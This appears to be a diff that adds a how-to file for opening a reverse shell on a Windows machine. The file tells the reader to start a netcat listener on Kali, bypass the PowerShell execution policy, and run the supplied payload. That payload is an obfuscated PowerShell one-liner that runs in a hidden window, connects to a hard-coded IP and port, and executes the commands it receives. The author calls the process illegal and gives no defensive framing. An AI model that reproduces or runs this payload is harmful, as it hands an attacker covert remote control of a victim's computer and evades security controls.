@@ -1,0 +1,29 @@
+First of all go to the notepad and paste the code i sent and save it with any name but with .ps1  extension . 
+
+You have to make the fololowing changes in the code that i sent that you have to change the ip address given in 
+the code with the original ip address of your kali linux or any other linux you using . which you can get by simply 
+writting the command " Ip addr show"    . After this you have to write another command in the kali linux that is 
+" nc -lvnp 4443 " . After runninhg this leave this terminal and wait for the magic .....
+
+Come to the "windows power shell" and "run as an administrator"... then navigate  to that directory through 
+cd command  as we normally do in the kali linux .... 
+when you go to that directory in which you file is saved with .ps1 extension, run this file as .\filename...
+But it will give you error .... You don't have to frustate ... instead you have to write this command in the 
+power shell      "Set-ExecutionPolicy -scope Process -ExecutionPolicy Bypass"         .... what will this command do ....
+As we know this is an unethical and illegal process so windows os does not allow you to perform this type of 
+activities ... So by this command we say to windows that just allow us to bypass your security policy one time ... 
+after doing this when you will execute that file and run it will run without showing any error ..... 
+
+Then go to your that kali terminal that you left earlier after runnibg that command and check it will say that the
+connection to this ip ie window is established . then you will press enter and it will  show taht you are in that window 
+where you can navigate to any directory and file and can do whatever you wana do .....
+
+
+
+command:
+Start-Process $PSHOME\powershell.exe -ArgumentList {$client = N''e""w-O'b'je"c"t System.Net.Sockets.TCPClient('192.168.130.129',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N''e'w'-O''b""je'c't -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e""x $data 2>&1 | O""u''t-S''t""ring );$sendback2 = $sendback + 'PS ' + (p""w''d).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden
+
+
+
+
+
